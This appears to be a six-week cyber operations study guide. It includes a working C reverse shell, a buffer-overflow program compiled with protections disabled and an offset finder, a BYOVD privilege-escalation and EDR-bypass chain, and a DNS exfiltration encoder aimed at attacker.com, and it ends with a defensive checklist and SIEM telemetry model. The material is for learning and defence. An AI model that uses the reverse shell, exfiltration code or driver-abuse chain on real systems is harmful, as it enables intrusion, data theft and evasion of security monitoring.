# Tactical Cyber Operations Guide: From Plan to Codebase

## Overview
This document serves as an in-depth technical manual expanding on the VADER 6-Week CSEC Study Plan. It breaks down each phase from high-level strategic planning, through the core theoretical concepts, down to the actual codebase implementation required to master these operational capabilities.

---

## Week 1 — Phase I Part A: C Memory Fundamentals

### Concept
To exploit memory, you must first understand how it is allocated, structured, and accessed at the hardware level. High-level languages abstract this away, but C requires manual management. 
- **Pointers:** Variables holding memory addresses.
- **Heap Allocation (`malloc`, `calloc`, `free`):** Dynamic memory management.
- **Memory Layout:** How data structures (like network headers) map exactly to continuous bytes in RAM.

### Plan
Create a C program that defines a network protocol header using structs, allocates it in memory, and inspects the raw byte addresses to understand data alignment and offsets.

### Codebase: TCP Header Memory Inspection (`tcp_struct.c`)
```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

// Define a simplified TCP Header structure
struct TCPHeader {
    uint16_t src_port;
    uint16_t dst_port;
    uint32_t seq_num;
    uint32_t ack_num;
    uint16_t flags;
    uint16_t window;
};

int main() {
    // Allocate memory on the heap
    struct TCPHeader *header = (struct TCPHeader *)malloc(sizeof(struct TCPHeader));
    
    if (header == NULL) {
        return 1;
    }

    // Populate data
    header->src_port = 4444;
    header->dst_port = 80;
    header->seq_num = 10001;

    printf("TCP Header Base Address: %p\n", (void*)header);
    printf("Offset to src_port: %p (0 bytes)\n", (void*)&header->src_port);
    printf("Offset to dst_port: %p (+2 bytes)\n", (void*)&header->dst_port);
    printf("Offset to seq_num:  %p (+4 bytes)\n", (void*)&header->seq_num);
    printf("Offset to ack_num:  %p (+8 bytes)\n", (void*)&header->ack_num);

    free(header); // Always free allocated memory
    return 0;
}
```

---

## Week 2 — Phase I Part B: Socket Programming & Reverse TCP

### Concept
Every network intrusion relies on standard OS system calls (syscalls). A reverse shell isn't magic; it is simply a socket connection where standard input, output, and error streams are redirected across the network.
- **Syscall Chain:** `socket()` -> `connect()` -> `dup2()` -> `execve()`.
- **File Descriptors (FDs):** In Linux, everything is a file. FD 0 is stdin, 1 is stdout, 2 is stderr. `dup2` forces these to point to the socket FD.

### Plan
Build the foundation of a reverse TCP shell in C. Compile it and analyze the execution flow.

### Codebase: Reverse Shell Stub (`rev_shell.c`)
```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    int sockfd;
    struct sockaddr_in attacker_addr;

    // 1. Create a TCP socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // 2. Define the attacker's IP and Port
    attacker_addr.sin_family = AF_INET;
    attacker_addr.sin_port = htons(4444);
    attacker_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Replace with actual IP

    // 3. Connect to the attacker
    if (connect(sockfd, (struct sockaddr *)&attacker_addr, sizeof(attacker_addr)) == 0) {
        // 4. Redirect standard file descriptors to the socket
        dup2(sockfd, 0); // STDIN
        dup2(sockfd, 1); // STDOUT
        dup2(sockfd, 2); // STDERR

        // 5. Spawn a shell
        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);
    }
    return 0;
}
```

---

## Week 3 — Phase III: Memory Corruption & Buffer Overflows

### Concept
Buffer overflows occur when data written to a buffer exceeds its allocated boundaries. On the stack, this overflow can overwrite critical control data, specifically the **Return Address (EIP/RIP)**, allowing an attacker to hijack the execution flow of the application.

### Plan
1. Write a vulnerable C program using the unsafe `strcpy` function.
2. Write a Python exploit script that generates a payload to find the exact byte offset to control the instruction pointer.

### Codebase: Vulnerable Program (`vuln.c`)
*Compile with: `gcc -fno-stack-protector -z execstack -no-pie vuln.c -o vuln`*
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    // UNSECURE: strcpy does not check bounds!
    strcpy(buffer, input); 
    printf("Buffer contains: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    } else {
        printf("Usage: %s <input>\n", argv[0]);
    }
    return 0;
}
```

### Codebase: Exploit Offset Finder (`exploit.py`)
```python
import sys

# Generate a cyclic pattern to find the exact offset
# E.g., Aa0Aa1Aa2Aa3...
def generate_pattern(length):
    pattern = ""
    for a in range(65, 91):
        for b in range(97, 123):
            for c in range(48, 58):
                if len(pattern) < length:
                    pattern += chr(a) + chr(b) + chr(c)
                else:
                    return pattern[:length]
    return pattern

payload = generate_pattern(100)
print(f"Run program with: ./vuln '{payload}'")
print("Observe the crash address in GDB. E.g., if it crashes at 0x31614130 (0a1A), the offset is the position of '0a1A' in the pattern.")
```

---

## Week 4 — Phase II: OS Architecture & Privilege Rings

### Concept
Modern operating systems segregate execution into Privilege Rings.
- **Ring 3 (User-Mode):** Applications run here. Restricted memory access.
- **Ring 0 (Kernel-Mode):** The OS core and hardware drivers. Full access.

**BYOVD (Bring Your Own Vulnerable Driver):** Attackers bypass Endpoint Detection and Response (EDR) by dropping a legitimately signed, but known vulnerable, driver onto the system. They then interact with it from Ring 3 to execute shellcode in Ring 0.

### Plan
Map out the attack chain for a known BYOVD CVE. No code generation, pure architecture mapping.

### Research Map: BYOVD Execution Chain (E.g., Capcom.sys CVE-2016-5743)
1. **Delivery:** Attacker drops `Capcom.sys` (signed by Capcom) onto the target.
2. **Loading:** Attacker uses Windows API `CreateService` to load the driver into Ring 0.
3. **Exploitation (DeviceIoControl):** The driver exposes an IOCTL (I/O Control) endpoint that takes a user-supplied pointer and executes it.
4. **Elevation:** Attacker crafts shellcode to duplicate the `SYSTEM` process token and applies it to their current Ring 3 `cmd.exe` process.
5. **Execution:** Attacker sends the IOCTL request. The kernel driver runs the shellcode. The Ring 3 shell becomes `SYSTEM`. EDR is bypassed because the action originated from kernel space.

---

## Week 5 — Phase IV: DNS Evasion & Network Manipulation

### Concept
DNS operates primarily over UDP port 53. Because it's foundational to internet routing, firewalls rarely block it. Attackers use DNS to exfiltrate data or tunnel Command and Control (C2) traffic. Data is encoded into the subdomains of a query sent to an attacker-controlled authoritative nameserver.

### Plan
Create a Python script capable of encoding arbitrary text into valid DNS subdomains, and decoding it upon reception.

### Codebase: DNS Tunneling Encoder/Decoder (`dns_exfil.py`)
```python
import base64
import re

DOMAIN = "attacker.com"

def encode_payload(data):
    # Encode data to Base64 to make it DNS safe
    b64_data = base64.b64encode(data.encode()).decode()
    
    # DNS labels can be max 63 characters. We split the payload.
    chunks = [b64_data[i:i+60] for i in range(0, len(b64_data), 60)]
    
    # Construct the malicious subdomain
    subdomain = ".".join(chunks)
    fqdn = f"{subdomain}.{DOMAIN}"
    return fqdn

def decode_payload(fqdn):
    # Remove the base domain
    subdomain_part = re.sub(f"\\.{DOMAIN}$", "", fqdn)
    # Reassemble the chunks
    b64_data = subdomain_part.replace(".", "")
    
    # Decode Base64
    try:
        decoded = base64.b64decode(b64_data).decode()
        return decoded
    except Exception as e:
        return f"Decoding error: {e}"

# Example Usage
secret = "exfil:password123;admin:true"
print(f"Original: {secret}")

dns_query = encode_payload(secret)
print(f"Target issues DNS query for: {dns_query}")

recovered = decode_payload(dns_query)
print(f"Attacker decodes to: {recovered}")
```

---

## Week 6 — Phase V: Blue Team & GeoDefend Integration

### Concept
Offense informs defense. To build robust defenses like GeoDefend, you must monitor behavioral indicators and enforce strict memory and protocol safety.

### Plan
Implement a code review checklist and define the telemetry structure required by a SIEM (Security Information and Event Management) to catch the attacks modeled in Weeks 1-5.

### Codebase / Implementation: GeoDefend Telemetry Standard

**1. Code Review Checklist for C Components:**
- [ ] Replace all instances of `strcpy`, `strcat`, `sprintf` with `strncpy`, `strncat`, `snprintf`.
- [ ] Ensure all array and pointer accesses are bounds-checked.
- [ ] Implement Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP) at compile time.

**2. SIEM Telemetry Data Model (JSON Format):**
To catch reverse shells and DNS tunneling, network telemetry must be structured and contextualized.

```json
{
  "event_type": "network_connection",
  "timestamp": "2026-05-31T14:32:01Z",
  "process_info": {
    "pid": 4512,
    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "parent_image": "C:\\Windows\\Explorer.exe",
    "command_line": "powershell.exe -w hidden -c \"...\""
  },
  "network": {
    "protocol": "TCP",
    "src_ip": "10.0.0.50",
    "src_port": 54122,
    "dst_ip": "192.168.1.100",
    "dst_port": 4444,
    "state": "ESTABLISHED"
  },
  "threat_intel": {
    "suspicious_port": true,
    "uncommon_process_network": true,
    "severity": "HIGH",
    "mitre_attack": "T1059.001"
  }
}
```
*Note: A rule engine would trigger an alert here because `powershell.exe` making a persistent TCP connection to port 4444 strongly indicates a reverse shell.*